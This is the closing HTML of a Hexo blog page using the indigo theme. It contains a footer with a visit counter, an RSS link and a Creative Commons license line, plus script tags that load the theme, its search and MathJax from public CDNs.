    <span id="busuanzi_container_site_pv" style="display:none">
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>Ver &copy; 2015 - 2020</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>


    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: false, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>



<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
});
</script>

<script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>




<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
